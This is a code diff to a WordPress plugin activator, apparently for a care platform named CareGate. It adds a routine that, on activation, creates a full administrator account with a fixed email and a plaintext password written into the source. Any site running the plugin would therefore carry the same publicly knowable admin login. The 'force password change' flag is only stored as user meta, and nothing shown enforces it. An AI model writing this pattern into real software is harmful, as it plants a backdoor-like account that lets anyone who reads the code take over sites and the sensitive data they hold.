@@ -308,8 +308,49 @@ class CareGate_Activator {
         // Create custom roles
         self::create_roles();
         
+        // Create default admin user
+        self::create_admin_user();
+        
         // Flush rewrite rules
         flush_rewrite_rules();
+    }
+
+    /**
+     * Create default admin user for the CareGate platform.
+     */
+    private static function create_admin_user() {
+        $admin_email = 'admin@caregate.co.uk';
+        $admin_password = 'CareGate2026!Admin';
+        $admin_name = 'CareGate Administrator';
+        
+        // Check if user already exists
+        if (email_exists($admin_email)) {
+            return;
+        }
+        
+        // Create the user
+        $user_id = wp_create_user($admin_email, $admin_password, $admin_email);
+        
+        if (!is_wp_error($user_id)) {
+            // Set user details
+            wp_update_user(array(
+                'ID' => $user_id,
+                'display_name' => $admin_name,
+                'first_name' => 'CareGate',
+                'last_name' => 'Administrator',
+                'role' => 'administrator' // Give full WordPress admin access
+            ));
+            
+            // Add custom meta for CareGate platform
+            update_user_meta($user_id, 'caregate_role', 'admin');
+            update_user_meta($user_id, 'caregate_force_password_change', true);
+            update_user_meta($user_id, 'caregate_admin_created', current_time('mysql'));
+            
+            // Log the creation
+            if (defined('WP_DEBUG') && WP_DEBUG) {
+                error_log('CareGate: Admin user created - Email: ' . $admin_email);
+            }
+        }
     }
 
     /**
